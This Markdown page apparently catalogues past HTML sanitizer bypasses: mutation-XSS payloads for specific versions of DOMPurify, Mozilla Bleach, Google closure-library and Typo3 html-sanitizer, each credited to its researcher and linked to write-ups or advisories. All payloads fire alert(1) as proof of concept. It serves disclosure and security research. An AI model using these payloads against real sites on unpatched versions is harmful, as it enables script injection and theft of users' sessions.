---
layout: page
title: Payload examples
---
This page contains some examples of payloads used to bypass sanitizers in the past. There are many other examples but to avoid redundancy we will add only ones that include new vectors or techniques.

## DomPurify

| Version | Payload                                                                                                                            | Credit                                             | Additional links                                                                                                                        |
|---------|----------------------------------------------------------------------------------------------------------------------------------  |----------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|
| 2.0.0   | `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`                                                                    | Michał Bentkowski [@SecurityMB](https://twitter.com/SecurityMB) | <https://research.securitum.com/dompurify-bypass-using-mxss/> |
| 2.0.17  | `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`                                                 | Michał Bentkowski [@SecurityMB](https://twitter.com/SecurityMB) | <https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/> |
| 2.0.17  | `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">`     | Gareth Heyes [@garethheyes](https://twitter.com/garethheyes) | <https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss> |
| 2.0.17  | `<math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”>`                                        | [@sqrtrev](https://twitter.com/sqrtrev) [@0xParrot](https://twitter.com/sqrtrev) @web_payload team [@GuesserSuper](https://twitter.com/GuesserSuper) | <https://twitter.com/0xsapra/status/1307929537749999616?ref_src=twsrc%5Etfw> |
| 2.2.0   | `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`                        | Daniel Santos [@bananabr](https://twitter.com/bananabr) | <https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f>  |
| 2.2.3   | `<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">` | Michał Bentkowski [@SecurityMB](https://twitter.com/SecurityMB) | <https://twitter.com/SecurityMB/status/1341290687963262978> |
| 3.0.8   | `<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">`                              | Kévin - Mizu [@kevin_mizu](https://twitter.com/kevin_mizu) | <https://mizu.re/post/playing-with-dompurify-ce-handling> |
| 3.1.0   | ```n = 506; var payload = `${"<div>".repeat(n)}<table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table>${"</div>".repeat(n)}`;``` | [icesfont](https://github.com/icesfont) | N/A |
| 3.1.7   | `<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">.` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://x.com/kinugawamasato/status/1843687909431582830> |
| 3.2.1   | `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(1)>">` | Yaniv Nizry [@YNizry](https://twitter.com/YNizry) | <https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/> |

## Mozilla Bleach

| Version | Payload                                                                      | Credit              | Additional links                                                          |
|---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
| 3.1.0   | `<noscript><style></noscript><img src=x onerror=alert(1)>`                     | Yaniv Nizry [@YNizry](https://twitter.com/YNizry)  | <https://checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach/>  |
| 3.1.1   | `<svg><style><img src=x onerror=alert(1)>`                                     | Yaniv Nizry [@YNizry](https://twitter.com/YNizry)  | <https://checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach/>  |
| 3.2.3   | `<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>` | Yaniv Nizry [@YNizry](https://twitter.com/YNizry)  | <https://github.com/mozilla/bleach/security/advisories/GHSA-vv2x-vrpj-qqpq> |

## Google closure-library

| Version | Payload                                                                      | Credit              | Additional links                                                          |
|---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
| v20190215   | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa> <https://www.youtube.com/watch?v=lG7U3fuNw3A> |

## Typo3 html-sanitizer

| Version | Payload                                                                      | Credit              | Additional links                                                          |
|---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
| 2.0.15   |  `<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">` | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-36020](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-47m6-46mj-p235) |
| 2.0.16   | `<![CDATA[<math><img src=x onerror=alert(1)>]]>`     | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-23499](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-hvwx-qh2h-xcfj) |

